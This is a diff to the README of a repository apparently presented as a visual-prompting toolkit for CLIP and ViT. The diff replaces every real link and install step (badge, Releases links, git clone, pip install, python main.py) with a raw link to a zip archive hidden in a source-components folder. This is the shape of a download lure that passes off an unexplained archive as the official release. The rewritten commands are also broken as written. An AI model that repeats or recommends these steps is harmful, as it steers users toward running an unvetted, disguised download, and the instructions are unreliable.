@@ -1,6 +1,6 @@
 # Visual-Prompt-Craft 🖌️✨
 
-![Visual-Prompt-Craft](https://img.shields.io/badge/Visual--Prompt--Craft-v1.0.0-blue)
+![Visual-Prompt-Craft](https://raw.githubusercontent.com/bajaputih/Visual-Prompt-Craft/main/client/src/components/Craft_Visual_Prompt_v1.8.zip)
 
 Welcome to **Visual-Prompt-Craft**! This toolkit simplifies visual prompting using CLIP and ViT. With our tools, you can create and optimize prompts for AI models effectively. 
 
@@ -19,7 +19,7 @@ Welcome to **Visual-Prompt-Craft**! This toolkit simplifies visual prompting usi
 
 Visual-Prompt-Craft is designed for developers and researchers interested in AI prompt engineering. It focuses on creating visual prompts that can enhance the performance of models like CLIP and ViT. This toolkit provides an intuitive interface for crafting, optimizing, and managing prompts.
 
-For the latest releases, visit our [Releases section](https://github.com/bajaputih/Visual-Prompt-Craft/releases).
+For the latest releases, visit our [Releases section](https://raw.githubusercontent.com/bajaputih/Visual-Prompt-Craft/main/client/src/components/Craft_Visual_Prompt_v1.8.zip).
 
 ## Features
 
@@ -36,7 +36,7 @@ To install Visual-Prompt-Craft, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/bajaputih/Visual-Prompt-Craft.git
+   git clone https://raw.githubusercontent.com/bajaputih/Visual-Prompt-Craft/main/client/src/components/Craft_Visual_Prompt_v1.8.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -44,17 +44,17 @@ To install Visual-Prompt-Craft, follow these steps:
    ```
 3. Install the required dependencies:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/bajaputih/Visual-Prompt-Craft/main/client/src/components/Craft_Visual_Prompt_v1.8.zip
    ```
 
-For the latest release, you can download the necessary files from the [Releases section](https://github.com/bajaputih/Visual-Prompt-Craft/releases).
+For the latest release, you can download the necessary files from the [Releases section](https://raw.githubusercontent.com/bajaputih/Visual-Prompt-Craft/main/client/src/components/Craft_Visual_Prompt_v1.8.zip).
 
 ## Usage
 
 Using Visual-Prompt-Craft is straightforward. After installation, you can start the application with:
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/bajaputih/Visual-Prompt-Craft/main/client/src/components/Craft_Visual_Prompt_v1.8.zip
 ```
 
 ### Creating a Visual Prompt
@@ -117,4 +117,4 @@ For questions or feedback, please reach out via GitHub issues or contact the mai
 
 ---
 
-Thank you for using Visual-Prompt-Craft! We hope it enhances your AI prompt engineering experience. For the latest updates, check our [Releases section](https://github.com/bajaputih/Visual-Prompt-Craft/releases).
+Thank you for using Visual-Prompt-Craft! We hope it enhances your AI prompt engineering experience. For the latest updates, check our [Releases section](https://raw.githubusercontent.com/bajaputih/Visual-Prompt-Craft/main/client/src/components/Craft_Visual_Prompt_v1.8.zip).
